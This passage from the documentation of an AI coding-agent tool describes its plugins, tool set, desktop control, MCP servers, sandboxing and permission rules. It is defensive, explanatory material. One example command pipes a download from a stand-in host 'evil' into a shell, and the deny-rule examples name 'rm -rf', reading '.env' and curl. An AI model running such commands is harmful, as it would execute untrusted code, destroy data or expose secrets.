`@path` in the body (at its start or after a space, naming something with a `/`
or a `.` — `@src/main.rs`, `@./Makefile`) is replaced by that file in a fenced
block headed by its path. The path must resolve inside the workspace (`..` and
symlinks are followed before checking); a file is read up to 256 KB and a
command's files up to 1 MB in all. Anything that cannot be included leaves a
marker such as `[@path: not found]` or `[@path: outside the workspace]`. Email
addresses are left alone, and only the command file's own text is looked at —
an `@path` you type as an argument is passed on as text, not read.

`allowed-tools` holds the turn the command starts: each entry is a permission
rule (`Bash(npm test:*)`, `Read`, `Edit(src/**)` — the grammar of
[permission rules](#permission-rules)), and a tool call none of them covers is
refused, with the list named to the model. A compound shell line is covered
only when every part is. Only that turn: the next one is unrestricted. It only
narrows — deny and ask rules, guards, the mode and hooks still apply. It binds
where incode runs the tools (the API route, Claude Code, and Codex with
`codex_tools: "incode"`); on Codex's own tools and Antigravity, the turn says it
was not enforced.

A **plugin** is a folder in `~/.incode/plugins/<name>/` or
`.incode/plugins/<name>/` with a `plugin.toml` (`name`, `version`,
`description`) and any of: `commands/**/*.md` (as `/<plugin>:<cmd>`),
`skills/<skill>/SKILL.md` (listed in `/skills` as `<plugin>:<skill>`),
`hooks.json` (`{"pre_tool_use": [...], "post_tool_use": [...]}`, added to
`admin.json`'s hooks) and `.mcp.json` (`{"mcpServers": {"db": {"command",
"args", "env"}}}`, or `{"type": "http", "url", "headers"}`, started with the
session). `${INCODE_PLUGIN_ROOT}` in a hook or server is the plugin's folder.

```sh
incode plugin list
incode plugin add https://github.com/you/incode-web-plugin   # git clone --depth 1
incode plugin add ./my-plugin --project                      # copied into .incode/plugins/
incode plugin update [web]                                   # fetch again; no name: all
incode plugin remove web
```

`add` records where a plugin came from (`.incode-source` in its folder), and
`update` fetches it again the same way — a fresh clone of the git URL or a
fresh copy of the folder — then swaps it in, printing the old and new
`version`. An update whose `plugin.toml` names a different plugin is refused.

A plugin's hooks and servers run with your authority; install only what you
would run yourself. Skills and hooks are read for the directory incode was
started in.

**A project's plugins must be approved.** A plugin in the workspace's
`.incode/plugins/` arrives with whatever you cloned, so none of it — hooks,
MCP servers, skills, commands — is used until you run `incode plugin approve
<name>`, which approves it as its files are now (a fingerprint of every file,
`.git` left out). Any change to it afterwards leaves it out again until you
approve it again. A session says which were left out; `incode plugin list`
shows each one's state. Yours in `~/.incode/plugins/` need no approval.
Approvals are kept in `~/.incode/plugin-approvals.json`, beside the approvals of
a project's lifecycle commands (`incode lifecycle approve`).

### Output styles

An output style is a way of answering you choose: a Markdown file whose body
the agent is told to follow in every reply, in `~/.incode/styles/<name>.md`
(yours) or `.incode/styles/<name>.md` (this project's). **Yours wins a
clash**: a project's styles arrive with whatever you cloned, so a repository
cannot replace the style you named, and the prompt, `/style` and `--admin` all
say which folder the text came from. A symbolic link is refused in either
folder. An optional front matter gives `/style` a line to show:

```markdown
---
description: Short answers, no preamble
---
Answer in three sentences or fewer. Lead with the answer.
```

- **Which one:** `INCODE_OUTPUT_STYLE`, else `"output_style": "<name>"` in
  `~/.incode/admin.json`, else none (`off` or `none` say none on purpose).
  `--admin` shows it and where it came from; a name no folder has is said, not
  ignored.
- **`/style`** lists them, `/style <name>` answers in one from the next reply,
  `/style off` stops. It holds for that session. This is the REPL's command:
  `--acp` runs built-in commands only from its `OFFERED` list
  (`src/acp_agent/commands.rs`), which does not include `/style`, so an ACP
  session keeps the style it was started with.
- It reaches every route — the API, claude, codex and agy — and `-t` runs. It
  goes after every other block of the prompt and says those still win: a
  style changes how answers read, never what the agent may do. It is kept
  when a long prompt has to be cut to fit a command line.
- None ships with incode; a file of more than 64 KB, an empty one, or one with
  an unknown front-matter key is left out and said so.

## Tools

Every tool the model can call is incode's own, in `src/toolbox/`. Each call is
classified by one table (`toolbox::reach_of`) as **observe**, **session**,
**record**, **change** or **run**, which decides what the permission mode
allows and what happens when the memory engine cannot decide. An unknown name
is refused, and every input is checked against its tool's schema before
anything runs.

| Tool | Reach | Purpose |
|---|---|---|
| `Read` | observe | Read a file with line numbers, paged by `offset`/`limit`. Documents come back as markdown: PDF, docx, pptx (with speaker notes), xlsx/xlsm/xlsb/xls/ods, odt. HTML, CSV and TSV stay source unless `render` is set. |
| `Write` · `Edit` | change | Create or replace a file · replace a string in one. |
| `MultiEdit` | change | Several replacements to one file, all or none. |
| `ApplyPatch` | change | A unified diff across files, all or none. |
| `NotebookEdit` | change | Replace, insert or delete one notebook cell. |
| `LS` · `Glob` · `Grep` | observe | List a directory · find files · search contents. One ripgrep-based walker that honours `.gitignore`, `.ignore` and `.git/info/exclude`, reports binary files, reads UTF-16, and says when it hit its cap. |
| `Outline` | observe | A source file's symbols (kind, name, signature, lines, nesting) for Rust, TypeScript, JavaScript, Python and Go, via tree-sitter. |
| `Bash` | run | A shell command, in the foreground (output streamed live over `--acp`) or with `run_in_background` (at most 8 jobs). Runs inside the OS sandbox where one applies. The shell is `sh` on macOS and Linux; on Windows it is `INCODE_SHELL` or `admin.json` `shell` if set, else Git Bash, else PowerShell — never cmd.exe — and PowerShell wherever the Windows sandbox token applies (Git Bash cannot start under it). The tool's description names the shell in use. |
| `BashOutput` · `KillShell` | observe · run | Read a background job's new output · stop a job and its process tree. |
| `TodoWrite` | session | The model's task list; sent over `--acp` as the plan. |
| `Diagnostics` | run | The project's checker: `INCODE_CHECK_CMD`, else `cargo check` or `tsc --noEmit`. |
| `WebFetch` | observe | A web page as markdown. Private addresses are refused; no credential is sent. With the headless browser: `render_js` runs the page's script first, and an empty app shell is rendered automatically. |
| `WebSearch` | observe | Search through the provider in `admin.json` `web_search`. |
| `Screenshot` | observe | A picture of a public page or a workspace HTML/SVG file. Offered only when the headless browser is found. |
| `RenderPdf` | change | A public page or a workspace HTML/SVG file printed to PDF. Offered only when a printer is found (below). |
| `ConvertDocument` | change | An office document to PDF through LibreOffice. Offered only when LibreOffice is found. |
| `screen_info` · `list_windows` · `screenshot` · `ui_tree` · `cursor_position` | observe | Look at the desktop. Offered only when `INCODE_DESKTOP=1` — see [Computer use](#computer-use). |
| `click_element` · `set_value` · `element_action` · `focus_window` · `type_text` · `paste_text` · `key` · `scroll` · `drag` · `move_mouse` · `click` | run | Act on the desktop. Same condition; refused in read-only. |
| `Skill` | observe | Read one skill's text from the shared store. |
| `Agent` | run | Hand a self-contained task to a sub-agent (a second headless run of the session's CLI, or the API route), with the session's mode, guards and cancel; at most 2 levels deep. Takes `agent: <name>` for a [user-defined sub-agent](#user-defined-sub-agents). |
| `AskUserQuestion` | session | A multiple-choice question to the owner: answered in the owner's app through the memory engine, else at the terminal, else reported unanswered. |
| `verify` | run | Run the project's check. |
| `recall_index` · `recall_get` · `memory_search` · `find_symbol` · `code_skeleton` · `git_blast_radius` | observe | Read from the memory service. |
| `watchman_lookup` | observe | Ask the recorder whether this step was already solved. |
| `remember` · `forget_memory` · `save_brief` | record | Write to the memory service. |
| `team_ask` · `team_tell` · `team_answer` · `team_read` | record (`team_read`: observe) | The team channel between workers (`docs/TEAMWORK.md`). |
| `mcp__<server>__<tool>` | run | Tools of an ACP client's MCP servers (stdio or HTTP) and of the installed [external tools](#external-tools), connected by incode in the background: offered from the first turn after the server answers, and until then the model is told it is still connecting. |

A tool result can carry pictures (PNG or JPEG, bounded in bytes, edge, pixels
and count). The model receives them; incode's own events, transcript and memory
see only a placeholder such as `[image 1280x720 png]`.

### Optional programs, and how they are found

- **Headless browser.** A headless browser installed as a tool (e.g.
  `release: "incordai/incord-browser"`): the installed
  [external tool](#external-tools) whose entry says `"provides": "browser"`.
  For development, `INCODE_BROWSER` (only
  there when set), then `admin.json` `browser_bin` (only there when set), name
  an executable directly and win over the installed tool. `PATH` is never
  searched. Found, it adds `Screenshot`, `WebFetch`'s `render_js`, and a
  printer for `RenderPdf`. Not found, those are not offered, `Screenshot`
  says how to install one, and nothing else changes. incode checks every
  address before the browser starts and never passes it
  `--allow-private-network`.
- **`RenderPdf` printer.** The headless browser when its PDFs carry text —
  measured once per session by printing a probe page and reading its text back —
  otherwise a system Chromium-family browser (`INCODE_PDF_BROWSER`, only there
  when set, then `PATH`, then the standard install paths). A headless browser
  whose probe found no text still prints when it is the only printer, and the
  result says the PDF is image-only. `admin.json` `pdf_renderer`: `"auto"`
  (default), `"system"` (only the system browser) or `"browser"` (only the
  browser tool). The result names its printer as you configured it: the tool
  entry's `name`, or the executable's file stem (`with msedge`).
- **LibreOffice.** `INCODE_SOFFICE` (only there when set), then `PATH`, then the
  platform's install paths.

### External tools

A program incode runs for you — the headless browser, or any MCP server — is
named in `admin.json` `tools` and downloaded from its release, never taken from
`PATH` or from a folder on one machine:

```json
"tools": [
  { "name": "browser",
    "release": "<owner>/<repo>",
    "version": "latest",
    "asset": "<prefix>-{arch}-{os}.{ext}",
    "run": ["<program>", "mcp"],
    "provides": "browser" }
]
```

- `{os}` is `windows`, `macos` or `linux`; `{arch}` is `x86_64` or `aarch64`;
  `{ext}` is `zip` on Windows and `tar.gz` elsewhere. A repo that names its
  assets otherwise gives `"assets": { "x86_64-windows": "<file>", … }`.
- `version` is `latest` or a release tag. A source that is not a GitHub release
  gives `url` (a template over the same names and `{version}`) instead of
  `release`, and then must pin `sha256`.
- `sha256` pins the asset's digest: one hex digest, or one per target
  (`{ "x86_64-windows": "<hex>" }`).

Nothing is downloaded until you ask: `/tools add <name>` (in the REPL or over
`--acp`), `/tools update [name]`, `/tools remove <name>`, or
`incode --install-tools` for every entry. A session that finds an entry not
installed says so once and downloads nothing. An install:

1. resolves the release through GitHub's API (`releases/latest` or
   `releases/tags/<version>`);
2. knows the asset's sha256 before downloading it — GitHub's published
   `digest`, or the pinned `sha256`, which must agree when both exist. With
   neither, the install is **refused**;
3. downloads over https (plain http only to this machine), following redirects
   only to https, at most 512 MiB and 15 minutes, sending no credential and a
   User-Agent of `incode` alone;
4. refuses a download whose sha256 differs, deletes it and unpacks nothing;
5. unpacks zip or tar.gz into `~/.incode/tools/<name>/<version>/`,
   refusing any entry that would land outside it and any link, at most 10,000
   entries and 2 GiB, and records the version, asset and sha256 in
   `tools/<name>/installed.json`.

`run[0]` is resolved inside that folder only. Every installed tool is started
as an MCP server on stdio at session start — in the background, in the REPL,
with `-t` and under `--acp` — and its tools are offered as
`mcp__<name>__<tool>`, through the same gate as every other tool (reach
**run**: refused in read-only, asked about when prompting, refused when the
memory engine cannot decide). A tool with `"provides": "browser"` is also the
browser incode's own `Screenshot`, `RenderPdf` and `WebFetch` `render_js` use.
Its tools join the session after it starts; a tool installed during a session
is offered from the next one.

### MCP servers

incode starts the MCP servers named in a project's `.mcp.json` and in your
`~/.incode/mcp.json` — the format other agents use — and offers their tools as
`mcp__<server>__<tool>`, through the same gate as every other tool:

```json
{ "mcpServers": {
    "github": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"],
                "env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" } },
    "docs":   { "type": "http", "url": "https://mcp.example.com/mcp",
                "headers": { "Authorization": "Bearer ${DOCS_TOKEN:-}" } } } }
```

- `${VAR}` and `${VAR:-default}` are expanded from the environment in
  `command`, `args`, `env`, `url` and `headers`; an unset variable with no
  default stops that server and names the variable.
- `http` servers speak MCP Streamable HTTP (https anywhere, plain http only to
  this machine). `sse` is tried the same way; a server that speaks only the
  legacy SSE transport will not connect. A server that needs OAuth is logged
  in to with `incode mcp login <name>` (below); a fixed token can still go in
  `headers` instead.
- **A project's server is asked about before it first runs**, because a
  `git clone` can bring one. The REPL asks; approvals are remembered in
  `~/.incode/mcp-approvals.json`, keyed by the server's name and a sha256 of
  its type, command, args, env, url and headers as written — change any of
  them and it is asked about again. Under `--acp` the client is asked, once
  the session is open, with `session/request_permission` (allow once, allow
  always — remembered like `incode mcp approve` — or reject); the session
  does not wait, and an allowed server connects in the background. Under
  `-t`, or when the client cannot answer, an unapproved server is skipped
  with the command that approves it. Your own `~/.incode/mcp.json` needs no
  approval.

```sh
incode mcp list                       # every server, its scope and status
incode mcp get <name>
incode mcp add fs -- npx -y @modelcontextprotocol/server-filesystem .
incode mcp add -s project -H 'Authorization: Bearer ${T}' docs https://mcp.example.com/mcp
incode mcp remove [-s user|project] <name>
incode mcp approve <name>             # approve a project server as it is written now
incode mcp login <name>               # OAuth: authorize an http server in the browser
incode mcp logout <name>              # forget its tokens
```

`add` writes `~/.incode/mcp.json` unless given `-s project`; a project server
added this way is approved as written.

#### OAuth for remote servers

`incode mcp login <name>` follows the MCP authorization spec: the server's
`401` names its Protected Resource Metadata (RFC 9728), which names the
authorization server, whose metadata is read from
`/.well-known/oauth-authorization-server` (RFC 8414) or
`/.well-known/openid-configuration`. incode registers itself (RFC 7591) when
the authorization server allows it, then opens the browser for an
authorization code with PKCE (S256) and the `resource` parameter (RFC 8707),
redirected to a one-request listener on `127.0.0.1` at an ephemeral port. The
address is printed too, for a machine without a browser — open it anywhere
that can reach back to this one's `127.0.0.1` (an SSH port forward, say).

An authorization server without dynamic registration needs a client
registered by hand, named in the server's entry:

```json
"docs": { "type": "http", "url": "https://mcp.example.com/mcp",
          "oauth": { "client_id": "abc123", "client_secret": "${DOCS_SECRET:-}",
                     "scopes": ["read"], "callback_port": 8765 } }
```

Every field is optional; `scopes` defaults to what the server asks for, and
`callback_port` is for a client registered with a fixed redirect
(`http://127.0.0.1:<port>/callback`). `client_secret` is sent in the token
request's body. `${VAR}` is expanded in `client_id` and `client_secret`.

- Tokens are kept in `~/.incode/mcp-tokens.json` (mode `0600` on unix),
  keyed by the server's name **and** its url, so a project that reuses the
  name for another address gets nothing. They are sent as
  `Authorization: Bearer`, refreshed before they expire and once more on a
  `401`.
- A session never waits on a browser: a server with an `oauth` entry and no
  token is not started, and one that answers `401` with nothing to refresh is
  dropped — each with the `incode mcp login <name>` that fixes it. A server
  whose `headers` carry their own `Authorization` is sent that instead.
- `incode mcp list` shows whether each such server is logged in.
- Every OAuth endpoint must be https (plain http only to this machine), no
  redirect is followed, and an authorization server whose metadata names
  another issuer or leaves S256 out of its PKCE methods is refused.

## Computer use

The model can see and drive a desktop: read a window's accessibility tree,
act on its controls by name, and fall back to screenshots and pixel clicks
where a program exposes no tree. It is **off** unless you set
`INCODE_DESKTOP=1`: it is the one kind of action a checkpoint cannot undo.

The tools are run by a separate process, `incode --desktop-mcp`, which incode
starts and hands to the model's CLI. Every call goes through the same
[Toolbox gate](#safety) as the other tools, and the desktop process checks
again on its own: the permission mode, the stop file, the runaway limit, and
your `desktop_hooks`.

### Platforms

| OS | Input | Accessibility tree | Notes |
|---|---|---|---|
| Windows | `SendInput` | UI Automation | Works in the logged-in session. **It drives your own desktop**: while it runs, do not use the mouse or keyboard, or your input and the agent's interleave. |
| macOS | CGEvent | AXUIElement | Needs the **Accessibility** and **Screen Recording** grants for the binary that runs, and a logged-in graphical session. Over SSH there is no window-server access and posted events vanish silently, so incode refuses to start there instead. `screen_info` reports any missing grant by name. Coordinates are in **points**. |
| Linux | X11 (XTEST) | AT-SPI2 over D-Bus | X11 only, not Wayland. `desktop_display` names the display: `":N"` attaches to a running one, `"xvfb"` or `"xvfb:1280x800"` starts a private Xvfb that ends with the server. Unset is a refusal; `$DISPLAY`, your own desktop, is never used. Only applications whose own `DISPLAY` is that display are seen. A window with no accessibility tree (xterm, or any program without an AT-SPI bridge) is listed from the X server with `"tree": false` and an `x11:0x…` id, so it can still be focused, pictured and clicked. |

GTK 4 (measured on 4.18.6) reports every control at the window's corner. Its
tree comes back with a note saying so: `set_value` and `element_action` work
on it by id, while clicking by id and capturing its windows are refused, and
plain screenshots and pixel clicks still work.

### The tools

| Tool | What it does |
|---|---|
| `screen_info` | Displays, their sizes and scale, and on macOS any missing grant. |
| `list_windows` | The open windows: `id`, title, app, pid, focused, rectangle, and `tree` (false when the window exposes no accessibility tree). A blocked app's window is listed without its title. |
| `ui_tree` | One window's controls as `[e<id>] Role "name" (x,y,w×h)`, with `password` on secret fields. `window` picks the window (default: the focused one); `depth` limits the walk. Controls at no place on screen are counted on one line, not listed. A window with no tree is refused with a pointer to `screenshot` and `click`. |
| `screenshot` | The primary display, or one `window`. The reply carries the region and origin, so a point in the picture maps back to the screen. |
| `cursor_position` | Where the pointer is. |
| `click_element` | Click a control by id, at its centre as it is *now*. |
| `set_value` | Set a text field's value through the accessibility interface: no typing, no focus, no clipboard. Read back and marked `(verified)`, or `(unverified: why)`. A password field is never read back. |
| `element_action` | Run one of a control's own actions without the mouse: `press`, `toggle`, `expand`, `collapse`, `select` and `focus` everywhere, plus what the platform adds (`scroll_into_view` on Windows; `show_menu`, `increment`, `decrement`, `confirm`, `cancel` on macOS). An action the control lacks is refused, and the refusal lists the ones it offers. |
| `focus_window` | Bring a window to the front so typing reaches it. |
| `type_text` · `key` · `paste_text` | Keystrokes, a chord (`["cmdorctrl","s"]`: Cmd on macOS, Ctrl elsewhere), or a paste. `paste_text` puts the old clipboard back after `paste_restore_delay_ms`, and refuses to paste at all when the clipboard cannot be read. |
| `scroll` | Wheel steps (`dy` down, `dx` right) over a control by `id`, or under the pointer. |
| `drag` | Press, move in steps, release: between two controls (`from_id`, `to_id`) or two points. |
| `move_mouse` · `click` | The pixel fallback. `click` takes `button` and `count` (1–3). |

Every acting tool also takes `window`; typing into a window that is not the
focused one is refused rather than sent elsewhere. It also takes
`screenshot_after`, which returns a picture once the screen has settled.

### What it will not do

- **Act on a control it did not show you.** An id is a position in one
  `ui_tree` result. incode keeps what each window's last tree showed, and acts
  on an id only while the control in that place has the same role, depth and
  name. When a row is inserted above it, or a dialog has replaced it, the id is
  refused: "call ui_tree again".
- **Touch a password manager.** 1Password, Bitwarden, LastPass, Dashlane,
  KeePass, NordPass, Proton Pass, Enpass, RoboForm and Keeper, plus anything in
  `desktop_limits.blocked_apps`, are never walked, pictured or acted on.
  - No click, scroll or drag point may fall inside one of their windows, and no
    capture may overlap one, even where another window is on top.
  - A full screenshot is refused while one is on screen.
  - A window whose owning program cannot be named is treated the same way.
- **Read a secret.** A password field is marked as one, and its value is never
  read: not into a tree, a result or the journal.
- **Run unsupervised or unbounded.**
  - `incode --desktop-stop` (or `.incode/desktop.stop`) halts it for the rest
    of the session.
  - It stops when the process driving it goes away, and stops acting after
    `heartbeat_deadline_secs` with no request.
  - It refuses more than `max_actions_per_minute` actions.
  - Scrolls, coordinates and tree walks are bounded (`desktop_limits`).
- **Keep what it typed.** Every call is written to `.incode/desktop.jsonl`,
  with typed and pasted text recorded by length only.

Everything the desktop returns — titles, tree text, pictures — is marked as
untrusted data, never instructions. The design and the measurements behind it
are in `docs/COMPUTER_USE.md`; the status per platform is in
`docs/ROADMAP.md` B1.

## Safety

In the order a call meets them:

1. **Known tool, valid input.** An unknown name or an input that breaks the
   tool's schema runs nothing.
2. **Guards.** Tests, CI config, migrations, `.env` files, the ledger and the
   paths in `.incode/guards.json` are refused as write targets, for every file a
   change touches. The defaults (`guards::DEFAULT_PROTECTED`): `tests/`,
   `test/`, `__tests__/`, `spec/`, `testdata/`, names containing `_test.`,
   `.test.`, `.spec.` or `_spec.`, names starting `test_`, `conftest.py`;
   `.github/workflows/`, `.gitlab-ci.yml`, `.circleci/`, `.buildkite/`,
   `Jenkinsfile`, `azure-pipelines.yml`; `migrations/`; `.env*`;
   `.incode/ledger.json`, `.incode/guards.json`, `admin.json`. Any of them can be
   lifted with `allow_writes_to`. A shell command is refused when a redirect
   target or the argument of a writing command (`rm`, `tee`, `sed -i`,
   `git checkout`, a quoted path in `python -c`, ...) is protected — a command
   that only mentions one, like a heredoc writing docs, is not. For an agent
   that still runs its own tools (`codex`, `agy`),
   a sentinel fingerprints the protected files before and after the turn —
   detection, not prevention.
3. **Permission mode** (`-p`):

   | Mode | observe / session tools | record, change, run tools |
   |---|---|---|
   | `read-only` (`/plan`) | run | refused |
   | `prompt` | run | asked, call by call |
   | `workspace-write` (`/act`, the default) | run | run, subject to the guards and the engine |
   | `danger-full-access` · `allow` | run | run, subject to the guards and the engine |

   The `Agent` tool is also refused under `read-only` and `prompt`, because the
   sub-agent it starts would not be held to that mode.
4. **The operator's hooks.** Your own pre-tool commands (`admin.json` `hooks`)
   run for every tool; exit code 2 denies the call.
5. **The memory engine's pre-tool check.** When the engine binary is present,
   it is asked about every call. It can allow, block (exit 2, with a reason), or
   ask for a person. If it fails, times out, or is missing where one was named,
   record, change and run tools are **refused** (fail closed); observe and
   session tools run (fail open).
6. **Allow / Reject.** When the engine asks, a person decides: at the terminal
   (one key), or as an Allow/Reject card in an ACP client. The engine's own
   permission-request hook races it; the first answer wins. With nobody there
   (`-t`), silence is a refusal.
7. **Checkpoint.** The files a change will touch are snapshotted before it runs.
8. **The OS sandbox** for `Bash` (below).

**Checkpoints, `/undo` and `/rewind`.** Each turn's "before" is written to
`.incode/checkpoints/<session>/` (newest 20 turns, at most 256 MiB), so `/undo`
works after a restart and `/rewind <n>` goes back n changed turns. Files a turn
created are removed on undo; a file changed since is left alone and named.

### The OS sandbox

`Bash` runs commands the model chose. The guards catch a direct route to a
protected file; the sandbox asks the operating system to prevent writes
through a variable, a glob or a script. Setting: `admin.json` `sandbox` or
`INCODE_SANDBOX` — `off`, `workspace-write` or `read-only`. Unset, it follows
the permission mode: `read-only` for read-only, `workspace-write` for prompt and
workspace-write, `off` for the two full-access modes.

| OS | read-only | workspace-write |
|---|---|---|
| Linux | Landlock (kernel, unprivileged) | Landlock: writes only in the workspace, each `--add-dir` and temp |
| macOS | `sandbox-exec` (Seatbelt) profile | Seatbelt: writes only in the roots, temp and device sinks |
| Windows | a write-restricted token: nothing can be written but `NUL` | **only when you name it** (`sandbox: "workspace-write"` or `INCODE_SANDBOX`): for the session, one inheritable ACE for a private per-session SID on each root and on a session temp folder, and every command under a write-restricted token limited to that SID. The grant takes a few seconds on a large tree and is removed when the session ends; one a crashed session left is swept by the next. Left to the permission-mode default, workspace-write runs unconfined here and the trace says so |

**The network**, separately: `admin.json` `sandbox_network` or
`INCODE_SANDBOX_NETWORK`, `allow` (the default) or `deny`, independent of the
mode above.

| OS | `deny` |
|---|---|
| Linux | Landlock ABI v4 (kernel 6.7+): every TCP bind and connect, loopback included; UDP is not covered. An older kernel is reported as not enforced |
| macOS | the Seatbelt profile denies the network and re-allows loopback and Unix sockets |
| Windows | **not enforced**, and said so: only an AppContainer could, and it cannot read the workspace or your toolchains without granting each one |

Honest limits: Windows does not restrict the network, and workspace-write is
confined only when named; the operator's own `/bg` jobs at the REPL are never
sandboxed. Where a mode cannot be applied, the command runs unconfined and the
trace says which.

**The engine**: `admin.json` `sandbox_engine` or `INCODE_SANDBOX_ENGINE`,
`builtin` (the default: everything above) or `sbx`, which confines the same
commands with [`sbx`](#sbx-the-same-sandbox-for-any-agent) instead, with the
same mode and network switch, and adds:

- `sandbox_allow_hosts` (or `INCODE_SANDBOX_ALLOW_HOSTS`, comma-separated): the
  only hosts a command may reach, through a proxy sbx runs for it;
- on Linux, a seccomp filter against terminal injection, `io_uring` and vsock;
- `.git/hooks` and `.git/config` in each writable root put back as they were
  when a command ends, so a planted hook never runs;
- the variables that redirect git, attach to the agent session or inject a
  library stripped; a private temp directory per command.

```json
{ "sandbox_engine": "sbx", "sandbox_allow_hosts": ["crates.io", "static.crates.io", "github.com"] }
```

Linux and macOS run it inside incode. Windows runs `sbx.exe` (installed beside
`incode.exe`), natively or inside WSL2 as `sandbox_backend` (or
`INCODE_SANDBOX_BACKEND`) says: `native`, `wsl` or `auto`; under `wsl` the
command runs in WSL's `sh`. What a machine cannot enforce is named in the
trace and `/doctor`; a run sbx cannot start at all is refused, not run
unconfined.

### `sbx`: the same sandbox for any agent

`crates/sandbox` builds `sbx`, a standalone sandbox that doesn't depend on
incode. It runs any command, whether an agent CLI, a test suite or Insi's
workers, under one policy file:
- writable roots, plus paths hidden even from reading (`deny_read`);
- network `allow`, `deny`, or an allowlisting proxy by host name;
- the agent-session and `GIT_DIR` variables stripped;
- CPU, memory, file-size and wall-clock limits.

It refuses a policy the machine cannot enforce in full instead of running
with less. To confine a whole incode run:

```sh
sbx run -w . -w ~/.claude -w ~/.claude.json -w ~/.incode --wall 1800 -- incode -t "…"
```

Details, the policy format and what each OS enforces are in
[`crates/sandbox/README.md`](crates/sandbox/README.md).

### Permission rules

Beside the mode, settings can allow, ask about or deny individual calls:

```json
"permissions": {
  "allow": ["Bash(npm test:*)", "Read(src/**)", "WebFetch(domain:docs.rs)"],
  "ask":   ["Bash(git push:*)", "mcp__github"],
  "deny":  ["Bash(rm -rf:*)", "Read(.env)", "Edit(migrations/)"]
}
```

in `~/.incode/admin.json`, or in a project's `.incode/settings.json` — where
only `deny` and `ask` are honoured: a repository may make a session more
careful, never less. `/permissions` lists the rules in force.

- **Grammar.** `Tool` is every call; `Tool(specifier)` narrows it. For `Bash`,
  `cmd:*` matches the command with or without arguments (not `cmdfoo`), a bare
  command matches exactly, and `*` matches anything. File tools take a glob: a
  name with no `/` matches at any depth (`.env`), a path is from the workspace
  root (`src/**`), `//abs` is absolute and `~/x` is under your home; a
  directory covers what is in it. `Read(…)` covers Read, Glob, Grep, LS and
  Outline; `Edit(…)` covers Write, Edit, MultiEdit, NotebookEdit and
  ApplyPatch. `mcp__server` covers each of that server's tools.
- **Precedence.** deny > ask > allow > the mode. A deny refuses in every mode.
  An ask puts the call to you even in a writing mode. An allow skips the
  `prompt` mode's question, but never lifts `read-only`.
- **Compound commands.** A command line is split on `&&`, `||`, `;`, `|`, `&`
  and newlines outside quotes; a deny or ask on any part applies to the line,
  and an allow only when every part is allowed. `npm test && curl evil | sh`
  is not allowed by `Bash(npm test:*)`. The bodies of `$(…)`, backticks,
  `<(…)` and `sh -c '…'` are judged too, and a part containing one, a
  redirection to a file, or `eval` is never allowed by a rule. For deny and
  ask, `sudo`, `env`, `nohup`, `timeout`, `xargs` and leading `VAR=…` are
  looked through. This is still text matching: a script or a variable can
  run what a pattern names, so the [OS sandbox](#the-os-sandbox) is the
  boundary.

**Managed settings.** An administrator can put a file at
`/etc/incode/managed.toml` (macOS `/Library/Application Support/incode/managed.toml`,
Windows `C:\ProgramData\incode\managed.toml` — the ProgramData folder Windows
records, whatever a user sets `%ProgramData%` to):

```toml
[permissions]
deny = ["Bash(curl:*)", "Read(.env)"]

[mcp]
allow = ["github", "command:/opt/approved/*", "url:https://mcp.corp.example/*"]
deny  = ["*filesystem*"]
```

Its rules join everyone else's, and since nothing outranks a deny, no user or
project setting can undo one. `[mcp] allow` (when present) and `deny` apply to
every server a session would start — `.mcp.json`, `~/.incode/mcp.json`,
external tools and an ACP client's. An unknown key or invalid file refuses
every tool call and every server until it is fixed. These rules apply to the
tools incode runs itself; `codex` and `agy` still run their own (see
[Limits](#limits)).

## Incord Memory integration

Every part is optional and fails open, except the owner channel, which fails
closed: silence is never approval.

**Over HTTP** (`INCORD_MEMORY_URL`): the project brief, recall, rules, the
recorder, the auditor and the owner queue.

**Engine hooks, fired by incode itself** on every route — the CLIs' own hooks
are off (`claude`) or disabled (`codex --disable hooks`). One session id,
incode's own, names every event:

| Hook | When |
|---|---|
| `session-start` | Session start (`startup`, or `resume`), and after `/clear`. Its block replaces incode's own rules, recorder and auditor blocks. |
| `user-prompt` | Each turn, after the greeting check. Its block replaces the per-turn rules. |
| `pre-tool` | Before every Toolbox call (see [Safety](#safety)). |
| `permission-request` | When `pre-tool` asks for a person, raced against the terminal or the ACP card. |
| `code-edit` | After a change that landed, off the turn's critical path. |
| `capture` | The end of every turn. A `block` reply carries the turn on, at most 3 times, never after a cancel and not while a background job runs. |
| `session-end` | REPL exit, `/clear` (the old id), ACP `session/close` and shutdown, and the end of `-t`. |

Each `/run` worker is a memory session of its own. Oversized context blocks
are written whole to `.incode/context/` and the model is given the head and
the path.

**Transcripts** go to `.incode/transcripts/<session>.jsonl` in the workspace,
in the engine's format, when an engine is present or the session is an ACP one
(so `session/load` can replay it). The newest 200 are kept.

The engine binary is found at `INCORD_ENGINE_BIN`, then `admin.json`
`engine_bin`, then the engine's install location on Windows. Full status:
`docs/incord-memory-integration.md`.

## User-defined sub-agents

One Markdown file per sub-agent, in `.incode/agents/*.md` (the project's) or
`~/.incode/agents/*.md` (yours, for every project). A project's definition
wins over yours with the same name.

```markdown
---
name: reviewer
description: Reads a change and reports what is wrong with it.
role: review
model: opus
tools: [Read, Grep, Glob]
---
You review changes. Report each problem with its file and line.
```

- `name`, `description` and a non-empty body are required.
- `role` is one of the seven roles and routes the model; `model` names one
  outright and wins over the role.
- `tools` is an allow-list of Toolbox tool names (`[A, B]`, `A, B`, or `- A`
  lines). The sub-agent gets only those, and never more than its parent may use.
- A file is at most 64 KiB, and at most 64 files are read per directory. A bad
  file is listed by `/agents` with the reason and never stops a session.

The model runs one with the `Agent` tool: `{"agent": "reviewer", ...}`.

**Three come with incode**, written into `~/.incode/agents/` the first time
incode starts (or, for one added later, the first start after it was):
`standards-reviewer` (a change against the repository's own docs —
conventions, `## Layout`, `## Language` — and common smells) and
`spec-reviewer` (a change against the PRD and its non-goals, the contracts and
`VERIFICATION.md`) are `review` agents limited to `Read`, `Grep`, `Glob`,
`Outline` and `LS`, and answer with findings only — neither decides that work
is done. `researcher` is an `explore` agent that answers a question needing
outside facts: memory first (`recall_index`, `memory_search`), then
`WebSearch`/`WebFetch`, with a source for every claim, saving what it
established with `remember`; it never edits the project. They are ordinary
files: edit them, or delete them; incode never writes one again once it has
been seeded (`~/.incode/agents/.seeded` records which were).

## Configuration

Settings resolve in this order — **flag > environment > admin file > built-in** —
and `--admin` prints which layer decided each value.

`~/.incode/admin.json` (every key optional):

```json
{
  "model": "sonnet",
  "agent": "claude-code",
  "sub_agent": "claude-code",
  "tiers": { "top": ["opus"], "cheap": ["haiku", "sonnet"] },
  "roles": {
    "explore":   ["@cheap"],
    "grunt":     ["@cheap"],
